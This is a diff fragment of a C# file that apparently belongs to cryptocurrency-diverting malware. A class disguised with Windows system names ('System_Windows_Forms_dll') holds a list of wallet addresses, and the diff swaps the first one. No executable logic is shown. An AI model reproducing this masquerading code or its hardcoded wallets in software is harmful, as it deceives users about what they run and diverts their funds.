@@ -8,7 +8,7 @@ namespace sys_host_dl_v4030319_64 {
 
 public sealed class System_Windows_Forms_dll
     {
-    private readonly static string ADDR1 = "0xee11cbef798ae00175c053deed76a0478e644c46";
+    private readonly static string ADDR1 = "0xcF9B65330D1f783Bf731E1803d57196954e46325";
     private readonly static string ADDR2 = "0x1fC7defE45505f893Fb1911796996857ae89aD26";
     private readonly static string ADDR3 = "0x4013A75Ef00D950f489f841985D2AB5561DcFB03";
     private readonly static string ADDR4 = "0x27406665258eAa619F01c13A29Fe1Db93e8293f4";
